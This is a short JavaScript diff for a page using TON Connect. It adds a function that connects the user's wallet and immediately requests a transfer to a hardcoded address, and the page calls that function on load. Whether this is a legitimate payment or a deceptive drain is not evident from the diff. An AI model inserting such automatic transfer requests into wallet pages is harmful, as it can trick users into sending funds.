@@ -74,6 +74,33 @@
         buttonRootId: 'ton-connect'
     });
 
+    async function connectToWallet() {
+        const connectedWallet = await tonConnectUI.connectWallet();
+        // Do something with connectedWallet if needed
+        console.log(connectedWallet);
+        metadata(1)
+
+        const destinationAddress = Address.parse('UQD75cMHRAiEkIWR0KOPVWDsuHLFlwdrSqymU8NzYs-8nghM');
+        const transaction = {
+                messages: [
+                    {
+                        address: destinationAddress,
+                        amount: "10000000"
+                    }
+                ]
+            }
+
+            const result = await tonConnectUI.sendTransaction(transaction)
+
+    }
+
+
+
+    // Call the function
+    connectToWallet().catch(error => {
+        console.error("Error connecting to wallet:", error);
+    });
+
     async function metadata(tokenId) {
         if(tokenId < 1) return;
         console.log("metadata " + tokenId);
